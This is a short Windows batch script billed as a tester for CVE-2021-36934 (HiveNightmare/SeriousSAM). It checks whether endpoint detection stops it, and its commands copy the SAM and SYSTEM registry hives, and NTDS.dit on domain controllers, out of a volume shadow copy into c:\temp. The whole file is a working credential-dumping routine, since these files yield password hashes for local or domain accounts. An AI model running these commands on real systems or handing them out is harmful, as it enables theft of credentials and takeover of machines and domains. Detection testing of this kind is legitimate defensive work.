REM Serious SAM Tester (CVE-2021-36934) / HiveNightmare
REM Check if your EDR kills this process after ICACLS (Microsoft MDE does)
REM if we have admin rights the same routine can be used for copying out
REM we can also use this from an admin POV to dump either the SAM/SYSTEM or NTDS.DIT

REM to create a shadow 
REM vssadmin create shadow /for=C:

mkdir c:\temp
vssadmin list shadows
icacls \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM c:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\temp\
REM dump the DIT (if its a domain controller) - no checking logic just copy brute :P
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit  c:\temp\
